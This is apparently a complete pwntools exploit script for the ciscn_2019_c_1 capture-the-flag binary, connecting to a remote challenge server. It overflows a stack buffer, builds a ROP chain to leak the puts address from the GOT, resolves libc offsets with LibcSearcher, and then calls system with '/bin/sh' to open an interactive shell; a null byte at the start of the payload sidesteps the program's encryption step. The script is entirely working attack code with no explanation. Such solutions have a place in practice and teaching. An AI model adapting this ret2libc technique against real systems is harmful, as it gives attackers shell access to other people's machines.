from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'amd64'

def encrypt(s):
    res = []
    for bt in s:
        if bt <= 96 or bt > 112:
            if bt <= 64 or bt > 90:
                if bt > 47 and bt <= 57:
                    res.append(bt ^ 0xF)
                else:
                    res.append(bt)
            else:
                # res += (bt ^ b'E')
                res.append(bt ^ 0xE)
        else:
            res.append(bt ^ 0xD)
    
    return bytes(res)

s = remote('node3.buuoj.cn', 27281)

elf = ELF('./ciscn_2019_c_1')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

main_addr = 0x400b28
pop_gadget = 0x400c83

payload1 = b'a'*0x58 + p64(pop_gadget) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload2 = b'\x00' + b'a'*0x57 + p64(pop_gadget) + p64(puts_got) + p64(puts_plt) + p64(main_addr)


s.recv()
s.sendline(b'1')
s.recvuntil('encrypted\n')
# s.sendline(encrypt(payload1))
s.sendline(payload2)

s.recvuntil('Ciphertext\n')
s.recvuntil('\n')

puts_real_addr = u64(s.recvuntil('\n', drop=True).ljust(8, b'\x00'))

s.success("Got puts real addr: 0x{:016X}".format(puts_real_addr))

libc = LibcSearcher('puts', puts_real_addr)
offset = puts_real_addr - libc.dump('puts')


s.sendline(b'1')
s.recvuntil('encrypted\n')

sys_addr = offset + libc.dump('system')
bin_sh = offset + libc.dump('str_bin_sh')

ret_addr = 0x4006b9

payload2 = b'a'*0x58 + p64(ret_addr) + p64(pop_gadget) + p64(bin_sh) + p64(sys_addr)

s.sendline(payload2)

s.interactive()
# print(encrypt(b'deqfrf'))

